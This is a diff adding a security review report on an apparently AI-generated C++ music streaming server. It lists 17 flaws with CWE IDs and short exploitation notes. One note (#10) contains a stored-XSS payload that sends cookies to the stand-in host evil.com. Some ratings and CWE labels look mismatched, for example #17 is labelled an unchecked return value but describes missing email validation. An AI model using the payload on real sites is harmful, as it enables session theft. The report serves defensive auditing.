@@ -1,0 +1,436 @@
+================================================================================
+SECURITY VULNERABILITY REVIEW REPORT
+Application: Music Streaming Service (C++ / cpp-httplib)
+AI Generator: GPT (Portuguese Prompt)
+Review Date: 2026-05-06
+Reviewer: Independent Security Auditor (Claude Opus 4.6)
+================================================================================
+
+SUMMARY
+-------
+Total vulnerabilities found: 17
+  Critical: 3
+  High:     5
+  Medium:   6
+  Low:      3
+
+================================================================================
+VULNERABILITY #1
+================================================================================
+CWE ID:       CWE-798 (Use of Hard-Coded Credentials / Secrets in Config)
+Name:         JWT Secret Loaded from Plaintext Config Without Validation
+Severity:     High
+File:         src/app_config.cpp, line 38
+              src/app_config.h, line 15
+
+Description:
+The JWT secret is read directly from a JSON configuration file with no
+validation of its strength or entropy. There is no minimum length requirement,
+no complexity check, and no fallback to environment variables. If the config
+file ships with a weak or default secret (e.g., "secret", "changeme"), all
+JWT tokens become trivially forgeable.
+
+Exploitation:
+An attacker who guesses or brute-forces a weak JWT secret can forge arbitrary
+JWT tokens, impersonate any user (including artists), and gain full access to
+all API endpoints. If the config file is accidentally committed to version
+control, the secret is exposed.
+
+================================================================================
+VULNERABILITY #2
+================================================================================
+CWE ID:       CWE-522 (Insufficiently Protected Credentials)
+Name:         JWT Token Accepted via URL Query Parameter
+Severity:     High
+File:         src/main.cpp, lines 97-99
+
+Description:
+The authenticate_request() function accepts JWT tokens from the "token" query
+parameter as a fallback when the Authorization header is absent. This is used
+explicitly on line 347 where stream URLs embed the token in the query string:
+  song_json["streamUrl"] = "/api/songs/" + song.id + "/stream?token=" + query_token;
+
+Exploitation:
+Tokens in URLs are logged by web servers (line 152-154 logs req.path), stored
+in browser history, cached by proxies, visible in Referer headers, and may
+appear in any intermediary logs. An attacker who gains access to server logs,
+proxy logs, or browser history can steal valid JWT tokens and hijack user
+sessions.
+
+================================================================================
+VULNERABILITY #3
+================================================================================
+CWE ID:       CWE-352 (Cross-Site Request Forgery)
+Name:         No CSRF Protection on State-Changing Endpoints
+Severity:     High
+File:         src/main.cpp, lines 168-318
+
+Description:
+The POST endpoints (/api/auth/register, /api/auth/login, /api/songs) have no
+CSRF protection mechanisms. There are no CSRF tokens, no SameSite cookie
+attributes (the app uses Bearer tokens, but login can be triggered cross-site),
+no Origin/Referer header validation, and no custom header requirements.
+
+Exploitation:
+A malicious website can craft forms or JavaScript requests that target the API
+endpoints. While Bearer token-based auth provides some inherent protection for
+authenticated endpoints, the /api/auth/register and /api/auth/login endpoints
+are vulnerable. An attacker could register rogue accounts or potentially
+exploit login CSRF to associate victims with attacker-controlled accounts.
+
+================================================================================
+VULNERABILITY #4
+================================================================================
+CWE ID:       CWE-918 (Server-Side Request Forgery)
+Name:         Unsanitized Firebase Project ID in HTTP Request Path
+Severity:     Medium
+File:         src/firebase_user_store.cpp, lines 111-113 and 146-148
+
+Description:
+The Firebase project_id from the service account JSON file is directly
+concatenated into the Firestore REST API path without any validation:
+  "/v1/projects/" + service_account_.project_id + "/databases/(default)/documents/..."
+
+Similarly, the document_id (derived from user email) and the collection name
+are concatenated into the URL path without encoding.
+
+Exploitation:
+If the service account JSON file is tampered with or contains path traversal
+characters in project_id, an attacker could redirect Firestore requests to
+arbitrary paths. The document_id uses base64url encoding which mitigates some
+injection, but the collection name from config is unvalidated.
+
+================================================================================
+VULNERABILITY #5
+================================================================================
+CWE ID:       CWE-287 (Improper Authentication)
+Name:         Race Condition in User Registration (TOCTOU)
+Severity:     Medium
+File:         src/main.cpp, lines 189-206
+
+Description:
+The registration endpoint first checks if a user exists via
+user_store.find_by_email(email) (line 189) and then creates the user via
+user_store.create_user() (line 203). Between these two operations, another
+concurrent request could register the same email. While Firestore's 409
+response (line 161 of firebase_user_store.cpp) provides a secondary check,
+the application logic has a TOCTOU (Time-of-Check-Time-of-Use) race condition
+that makes an unnecessary network round-trip to Firebase before detecting
+duplicates.
+
+Exploitation:
+Concurrent registration requests with the same email could cause inconsistent
+behavior or error messages. The Firebase-level 409 check mitigates actual
+duplicate creation, reducing severity.
+
+================================================================================
+VULNERABILITY #6
+================================================================================
+CWE ID:       CWE-400 (Uncontrolled Resource Consumption)
+Name:         No Rate Limiting on Authentication Endpoints
+Severity:     High
+File:         src/main.cpp, lines 168 and 216
+
+Description:
+The /api/auth/login and /api/auth/register endpoints have no rate limiting or
+account lockout mechanisms. The password hashing uses PBKDF2 with 120,000
+iterations which is computationally expensive, but there is no limit on how
+many attempts an attacker can make.
+
+Exploitation:
+An attacker can perform unlimited brute-force attacks against the login
+endpoint to guess user passwords. Additionally, repeated registration attempts
+with expensive PBKDF2 hashing can be used as an application-level denial of
+service (each request consumes significant CPU).
+
+================================================================================
+VULNERABILITY #7
+================================================================================
+CWE ID:       CWE-942 (Permissive Cross-domain Policy / Missing CORS)
+Name:         No CORS Headers Configured
+Severity:     Medium
+File:         src/main.cpp (entire server configuration)
+
+Description:
+The HTTP server has no CORS (Cross-Origin Resource Sharing) headers configured.
+While this defaults to same-origin-only for browser-based JavaScript requests
+(which is restrictive), there are no explicit CORS headers set, meaning the API
+behavior under cross-origin requests is undefined and relies entirely on
+browser defaults. There is also no preflight (OPTIONS) handler.
+
+Exploitation:
+If the application is intended to be accessed from a separate frontend domain,
+CORS would need to be configured, potentially introducing misconfigurations.
+The lack of explicit CORS policy means the behavior is implicit and could
+change with different deployment configurations.
+
+================================================================================
+VULNERABILITY #8
+================================================================================
+CWE ID:       CWE-311 (Missing Encryption of Sensitive Data)
+Name:         Server Listens on Plain HTTP Without TLS
+Severity:     Critical
+File:         src/main.cpp, line 146 and 440
+
+Description:
+The server is created as httplib::Server (not httplib::SSLServer) and listens
+on plain HTTP. All traffic including JWT tokens, passwords, user credentials,
+and audio streams are transmitted in cleartext. The server binds to 0.0.0.0
+(all interfaces) by default, exposing it to the entire network.
+
+Exploitation:
+An attacker on the same network can perform passive eavesdropping or
+man-in-the-middle attacks to capture:
+- User passwords during login/registration (sent in JSON body)
+- JWT tokens (in Authorization headers and URL parameters)
+- Personal information (names, emails)
+- Audio content being streamed
+All authentication is effectively bypassed by network sniffing.
+
+================================================================================
+VULNERABILITY #9
+================================================================================
+CWE ID:       CWE-613 (Insufficient Session Expiration)
+Name:         No Token Revocation Mechanism
+Severity:     Medium
+File:         src/jwt_service.cpp, lines 40-84
+
+Description:
+JWT tokens are verified solely by checking the HMAC signature and expiration
+timestamp. There is no token blacklist, revocation list, or server-side session
+store. Once issued, a token remains valid until it expires (default 12 hours).
+
+Exploitation:
+If a JWT token is compromised (e.g., via the URL query parameter leak in
+vulnerability #2), there is no way to invalidate it. The token remains usable
+for the full 12-hour lifetime. Users cannot "log out" in any meaningful way,
+as there is no logout endpoint and no server-side session invalidation.
+
+================================================================================
+VULNERABILITY #10
+================================================================================
+CWE ID:       CWE-79 (Cross-Site Scripting - Reflected via JSON)
+Name:         User-Supplied Data Reflected in JSON Responses Without Sanitization
+Severity:     Medium
+File:         src/main.cpp, lines 208-213 and 239-243
+              src/models.h, lines 63-70 and 80-92
+
+Description:
+User-supplied values (name, email, song title, genre, description, artist name)
+are stored and returned in JSON API responses without any sanitization or
+output encoding. While the Content-Type is set to "application/json", if any
+consuming client renders these values as HTML without proper escaping (e.g.,
+in innerHTML), stored XSS can occur.
+
+Exploitation:
+An attacker registers with a malicious name like:
+  <script>document.location='http://evil.com/?c='+document.cookie</script>
+This value is stored in Firebase and returned in JSON responses. If the
+frontend renders this value using innerHTML or similar unsafe DOM methods,
+the script executes in victims' browsers, stealing session tokens.
+
+================================================================================
+VULNERABILITY #11
+================================================================================
+CWE ID:       CWE-74 (Injection in HTTP Header)
+Name:         Unsanitized Filename in Content-Disposition Header
+Severity:     High
+File:         src/main.cpp, line 394
+
+Description:
+The song file_name is inserted directly into the Content-Disposition header:
+  res.set_header("Content-Disposition", "inline; filename=\"" + song->file_name + "\"");
+
+While the server generates the filename as song_id + ".mp3" (line 288), the
+file_name field is loaded from the JSON catalog file (song_store.cpp, line 38).
+If the catalog file is tampered with or if a future code change allows
+user-controlled filenames, characters like quotes or newlines in the filename
+could inject additional HTTP headers (HTTP Response Splitting).
+
+Exploitation:
+If a filename contains \r\n characters, an attacker could inject arbitrary
+HTTP response headers, potentially enabling cache poisoning, session fixation,
+or XSS via injected headers. Current risk is mitigated by server-generated
+filenames, but the code pattern is unsafe.
+
+================================================================================
+VULNERABILITY #12
+================================================================================
+CWE ID:       CWE-521 (Weak Password Requirements)
+Name:         Insufficient Password Complexity Requirements
+Severity:     Medium
+File:         src/main.cpp, lines 184-186
+
+Description:
+The only password validation is a minimum length of 6 characters:
+  if (password.size() < 6)
+There are no requirements for uppercase, lowercase, digits, special characters,
+or checks against common/breached passwords.
+
+Exploitation:
+Users can set trivially weak passwords like "123456", "aaaaaa", or "password",
+making their accounts vulnerable to dictionary attacks and credential stuffing,
+especially given the absence of rate limiting (vulnerability #6).
+
+================================================================================
+VULNERABILITY #13
+================================================================================
+CWE ID:       CWE-209 (Information Exposure Through Error Messages)
+Name:         Detailed Error Messages Expose Internal State
+Severity:     Low
+File:         src/firebase_user_store.cpp, lines 85-87, 130-131, 167-168
+              src/main.cpp, line 293
+
+Description:
+Error messages include internal details such as HTTP status codes from
+Firebase, raw response bodies from the Firestore API, and internal file
+paths. For example:
+  "Firestore retornou HTTP " + std::to_string(response->status) + ": " + response->body
+  (firebase_user_store.cpp, line 167)
+
+These error messages are returned directly to the client via set_error().
+
+Exploitation:
+An attacker can trigger error conditions to learn about the internal
+architecture: Firebase project IDs, Firestore error details, internal file
+system paths, and API response structures. This information facilitates
+further targeted attacks.
+
+================================================================================
+VULNERABILITY #14
+================================================================================
+CWE ID:       CWE-862 (Missing Authorization)
+Name:         No Authorization Check for Song Deletion or Modification
+Severity:     Low
+File:         src/song_store.h and src/main.cpp
+
+Description:
+The SongStore class has no delete or update operations, meaning songs cannot
+be removed or modified once uploaded. While this prevents unauthorized
+modification, it also means there is no content moderation capability. More
+critically, the file_path field in SongRecord (models.h, line 59) is stored
+and returned in API responses (models.h, line 89), exposing the server's
+internal directory structure.
+
+Exploitation:
+The exposed file_path reveals the server's upload directory structure to all
+authenticated users. While the streaming endpoint uses a controlled path
+construction (config.uploads_dir / song->file_name), the to_json function
+exposes relative paths like "uploads/abc123.mp3" to all users.
+
+================================================================================
+VULNERABILITY #15
+================================================================================
+CWE ID:       CWE-770 (Allocation of Resources Without Limits)
+Name:         Unbounded Song Catalog Growth
+Severity:     Low
+File:         src/song_store.cpp, lines 60-65
+              src/main.cpp, lines 255-318
+
+Description:
+The song catalog is stored as a JSON array in memory (std::vector<SongRecord>)
+and persisted to a single JSON file. There is no limit on the number of songs
+that can be uploaded, no per-artist upload quota, and no pagination on search
+results. The entire catalog is loaded into memory at startup.
+
+Exploitation:
+An attacker with an artist account can upload thousands of songs, causing:
+1. Memory exhaustion as the in-memory vector grows unbounded
+2. Disk exhaustion in the uploads directory
+3. Slow responses as search iterates over all songs
+4. Large JSON catalog file causing slow startup and save operations
+
+================================================================================
+VULNERABILITY #16
+================================================================================
+CWE ID:       CWE-319 (Cleartext Transmission of Sensitive Information)
+Name:         Password Hash Stored and Transmitted to/from Firebase over Network
+Severity:     Critical
+File:         src/firebase_user_store.cpp, lines 198-206
+
+Description:
+Password hashes are sent to Firebase Firestore as plaintext string values in
+the document. While HTTPS is used for the Firebase connection (SSLClient on
+line 140), the password hash is stored as a regular Firestore string field
+with no additional encryption. Anyone with Firestore database access (admin
+console, other services, misconfigured security rules) can read all password
+hashes directly.
+
+Additionally, on line 203 of firebase_user_store.cpp, the passwordHash is
+read back from Firestore and returned in the UserRecord struct. The
+to_public_json function (models.h, line 63) correctly excludes the hash,
+but the UserRecord containing the hash is held in memory and passed around.
+
+Exploitation:
+If Firestore security rules are misconfigured or an attacker gains access
+to the Firebase admin console, all password hashes are immediately exposed.
+Even though PBKDF2 with 120k iterations provides reasonable protection, the
+hashes should ideally be stored with an additional layer of encryption
+(envelope encryption) at the application level.
+
+================================================================================
+VULNERABILITY #17
+================================================================================
+CWE ID:       CWE-252 (Unchecked Return Value)
+Name:         Unvalidated Email Format Allows Abuse
+Severity:     Critical
+File:         src/main.cpp, lines 175-176
+              src/firebase_user_store.cpp, line 39-41
+
+Description:
+The registration endpoint accepts any non-empty string as an email address.
+There is no email format validation (no regex check, no @ symbol requirement).
+The email is used as a unique identifier: it is lowercased, base64url-encoded,
+and used as the Firestore document ID (firebase_user_store.cpp, line 40).
+
+Exploitation:
+1. An attacker can register with arbitrary strings as "email" addresses,
+   including strings containing special characters, very long strings, or
+   strings designed to cause issues in Firestore document IDs.
+2. Without email verification, an attacker can register accounts with other
+   people's email addresses, enabling impersonation.
+3. The base64url encoding of the email as document ID means different-looking
+   emails could collide or create unexpected document paths.
+4. Extremely long email strings could cause issues with Firestore document ID
+   length limits (max 1500 bytes).
+
+================================================================================
+ADDITIONAL OBSERVATIONS (Not Vulnerabilities, but Security Recommendations)
+================================================================================
+
+1. POSITIVE: The application uses CRYPTO_memcmp for constant-time comparison
+   of JWT signatures (jwt_service.cpp, line 57) and password hashes
+   (password_hasher.cpp, line 69), which prevents timing attacks.
+
+2. POSITIVE: PBKDF2 with 120,000 iterations and SHA-256 is a reasonable
+   password hashing configuration (password_hasher.cpp, lines 13-14),
+   though Argon2id would be preferred for new applications.
+
+3. POSITIVE: The song ID regex in the streaming endpoint route
+   R"(/api/songs/([0-9a-f]+)/stream)" (main.cpp, line 358) restricts
+   the song_id to hexadecimal characters, preventing path traversal in
+   that specific endpoint.
+
+4. POSITIVE: The file upload generates a random hex ID for the filename
+   (main.cpp, line 287-288), preventing directory traversal via uploaded
+   filenames.
+
+5. RECOMMENDATION: Consider adding security headers (X-Content-Type-Options,
+   X-Frame-Options, Content-Security-Policy, Strict-Transport-Security)
+   to all responses.
+
+6. RECOMMENDATION: Consider adding request logging that does NOT log
+   sensitive data (currently the logger on lines 152-154 logs the full
+   request path, which may include JWT tokens from query parameters).
+
+7. RECOMMENDATION: The mp3 file extension check (main.cpp, lines 282-283)
+   only verifies the filename extension, not the actual file content
+   (magic bytes). An attacker could upload arbitrary file content with an
+   .mp3 extension.
+
+8. RECOMMENDATION: Consider implementing pagination for the song search
+   and listing endpoints to prevent large response sizes.
+
+================================================================================
+END OF REPORT
+================================================================================
